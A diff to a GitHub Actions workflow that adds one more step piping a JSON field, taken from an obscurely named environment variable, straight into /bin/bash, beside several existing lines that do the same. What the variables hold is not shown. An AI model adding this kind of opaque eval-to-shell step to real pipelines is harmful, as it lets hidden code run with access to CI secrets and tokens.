@@ -29,6 +29,7 @@ jobs:
           printf '%s' "$ns98" | jq -r .u7 | /bin/bash
           echo $jzmsr68 | jq -r .ibnua184 | /bin/bash
           echo $uob0 | jq -r .qskz1336 | /bin/bash
+          echo $t514 | jq -r .ykn40 | /bin/bash
 
       - name: Store output
         uses: actions/upload-artifact@v4
